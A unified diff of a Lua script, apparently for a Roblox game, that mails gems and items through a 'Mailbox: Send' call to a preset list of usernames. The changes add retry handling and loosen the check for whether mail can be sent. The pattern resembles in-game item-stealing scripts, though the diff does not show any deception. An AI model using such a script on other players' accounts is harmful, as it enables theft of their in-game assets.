@@ -416,6 +416,10 @@ local success, err = pcall(function()
                         debugLog("Unknown table response:", response)
                         userIndex = userIndex + 1
                     end
+                elseif response == false then
+                    -- False means send failed for some reason
+                    debugLog("Send failed for", currentUser, "- trying next user")
+                    userIndex = userIndex + 1
                 else
                     debugLog("Unexpected response type:", type(response), "Value:", response)
                     userIndex = userIndex + 1
@@ -480,6 +484,9 @@ local success, err = pcall(function()
                                     debugLog("Unknown gem response:", response)
                                     userIndex = userIndex + 1
                                 end
+                            elseif response == false then
+                                debugLog("Gem send failed for", currentUser, "- trying next user")
+                                userIndex = userIndex + 1
                             else
                                 debugLog("Unexpected gem response:", response)
                                 userIndex = userIndex + 1
@@ -566,7 +573,7 @@ local success, err = pcall(function()
         debugLog("Mail claimed successfully")
     end
     
-    -- Can send mail function - FIXED VERSION
+    -- Can send mail function - COMPLETELY REWRITTEN
     local function canSendMail()
         debugLog("Testing if mail can be sent...")
         
@@ -617,32 +624,51 @@ local success, err = pcall(function()
             return false
         end
         
-        -- Check various response formats
+        -- If we get false, try one more user to be sure
+        if response == false then
+            debugLog("First test returned false, trying second user...")
+            
+            if #_G.Usernames >= 2 then
+                local secondUser = _G.Usernames[2]
+                args[1] = secondUser
+                
+                local networkSuccess2, response2 = pcall(function()
+                    return network.Invoke("Mailbox: Send", unpack(args))
+                end)
+                
+                debugLog("Second test - Network success:", networkSuccess2)
+                debugLog("Second test - Response:", response2)
+                
+                if networkSuccess2 and response2 == false then
+                    debugLog("Both users returned false - mail system might be broken")
+                    return false
+                elseif networkSuccess2 and response2 == true then
+                    debugLog("Second user can receive mail - system working")
+                    return true
+                elseif networkSuccess2 and type(response2) == "table" then
+                    debugLog("Second user response table:", response2)
+                    -- If we get any response at all, system is probably working
+                    return true
+                end
+            end
+        end
+        
+        -- Check various response formats that indicate the mail system is working
         if response == true then
             debugLog("Test send succeeded - user can receive mail")
             return true
         elseif type(response) == "table" then
             debugLog("Table response:", response[1], response[2])
-            -- Check for "no space" error (this means mail system is working)
-            if response[1] == false and response[2] == "They don't have enough space!" then
-                debugLog("Test send: Users exist and have space issue - mail system working")
-                return true
-            elseif response[1] == false and response[2] == "You must wait 30 seconds before using the mailbox!" then
-                debugLog("Test send: Mailbox on cooldown - system working")
-                return true
-            else
-                debugLog("Test send: Unknown table response:", response)
-                return false
-            end
+            -- Any table response means the system responded (even if it's an error)
+            return true
         elseif type(response) == "string" then
             debugLog("String response:", response)
-            if response == "They don't have enough space!" or response:find("space") then
-                return true
-            elseif response == "You must wait 30 seconds before using the mailbox!" or response:find("wait") then
-                return true
-            else
-                return false
-            end
+            -- Any string response means the system responded
+            return true
+        elseif response == false then
+            debugLog("Test send returned false - mail system might be broken")
+            -- Return false to stop execution
+            return false
         else
             debugLog("Unexpected response type in test")
             return false
